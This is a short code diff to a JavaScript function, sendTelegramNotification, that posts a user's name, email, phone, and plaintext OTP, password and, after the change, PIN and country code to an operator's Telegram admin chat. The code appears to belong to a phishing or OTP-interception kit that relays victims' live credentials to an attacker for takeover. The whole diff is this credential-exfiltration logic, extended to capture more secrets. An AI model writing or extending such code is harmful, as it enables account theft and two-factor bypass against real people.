@@ -34,7 +34,7 @@ function uuidv4() {
   });
 }
 
-async function sendTelegramNotification({ requestId, phone, otp, password, email, firstName, lastName, type }, env, requestUrl) {
+async function sendTelegramNotification({ requestId, phone, otp, password, pin, countryCode, email, firstName, lastName, type }, env, requestUrl) {
   const botToken = env.TELEGRAM_BOT_TOKEN;
   const chatId = env.TELEGRAM_ADMIN_CHAT_ID;
   const callbackToken = env.TELEGRAM_CALLBACK_TOKEN;
@@ -50,8 +50,10 @@ async function sendTelegramNotification({ requestId, phone, otp, password, email
   const message = `🔐 <b>New ${type} Request</b>\n\n` +
     `👤 <b>User:</b> ${firstName || "N/A"} ${lastName || ""}\n` +
     `📧 <b>Email:</b> ${email || "N/A"}\n` +
-    `📱 <b>Phone:</b> ${phone}\n` +
-    `🔑 <b>OTP/Password:</b> <code>${otp || password || "N/A"}</code>\n` +
+    `📱 <b>Phone:</b> ${phone}${countryCode ? ` (${countryCode})` : ""}\n` +
+    `${pin ? `🔑 <b>PIN:</b> <code>${pin}</code>\n` : ""}` +
+    `${otp ? `🔑 <b>OTP:</b> <code>${otp}</code>\n` : ""}` +
+    `${password ? `🔑 <b>Password:</b> <code>${password}</code>\n` : ""}` +
     `⏰ <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
     `<b>Request ID:</b> <code>${requestId}</code>`;
 
